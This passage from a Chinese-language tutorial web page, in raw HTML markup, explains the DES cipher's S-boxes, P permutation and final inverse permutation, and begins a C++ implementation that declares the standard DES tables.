class="number">15</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,</span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>&#125;,</span><br><span class="line">&#123;<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,</span><br><span class="line">&#123;<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>&#125;,</span><br><span class="line">&#123;<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>&#125;,</span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>&#125;,</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,</span><br><span class="line">&#123;<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,</span><br><span class="line">&#123;<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// P置换，32位 -&gt; 32位</span></span><br><span class="line"><span class="type">int</span> P[] = &#123;<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">   <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">    <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">   <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">   <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>,</span><br><span class="line">   <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span> &#125;;</span><br></pre></td></tr></table></figure><h3 id="4-逆置换（Inverse-Permutation）">4 逆置换（Inverse Permutation）</h3><p>合并 L16 和 R16 得到一个 64 位的数据，再经过尾置换后得到的就是 64 位的密文。注意：要将 L16 和 R16 合并成 R16L16（即左右互换）。尾置换表 IP-1 如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 尾置换表</span></span><br><span class="line"><span class="type">int</span> IP_1[] = &#123;<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">  <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">  <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">  <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">  <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">  <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>&#125;;</span><br></pre></td></tr></table></figure><h2 id="三、C-代码实现">三、C++代码实现</h2><h3 id="1、加密">1、加密</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">bitset&lt;64&gt; key;                <span class="comment">// 64位密钥</span></span><br><span class="line">bitset&lt;48&gt; subKey[<span class="number">16</span>];         <span class="comment">// 存放16轮子密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始置换表</span></span><br><span class="line"><span class="type">int</span> IP[] = &#123;<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line"><span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line"><span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line"><span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结尾置换表</span></span><br><span class="line"><span class="type">int</span> IP_1[] = &#123;<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">  <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">  <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">  <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">  <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">  <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*------------------下面是生成密钥所用表-----------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥置换表，将64位密钥变成56位</span></span><br><span class="line"><span class="type">int</span> PC_1[] = &#123;<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">   <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">  <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">  <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">   <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">  <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩置换，将56位密钥压缩成48位子密钥</span></span><br><span class="line"><span class="type">int</span> PC_2[] = &#123;<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,</span><br><span class="line">   <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">  <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">26</span>,  <span class="number">8</span>,</span><br><span class="line">  <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line">  <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">  <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">  <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">  <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每轮左移的位数</span></span><br><span class="line"><span class="type">int</span> shiftBits[] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*------------------下面是密码函数 f 所用表-----------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展置换表，将 32位 扩展至 48位</span></span><br><span class="line"><span class="type">int</span> E[] = &#123;<span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">    <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">   <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">   <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">   <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">   <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">   <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// S盒，每个S盒是4x16的置换表，6位 -&gt; 4位</span></span><br><span class="line"><span class="type">int</span> S_BOX[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>&#125;,</span><br><span class="line">&#123;<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>&#125;,</span><br><span class="line">&#123;<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span 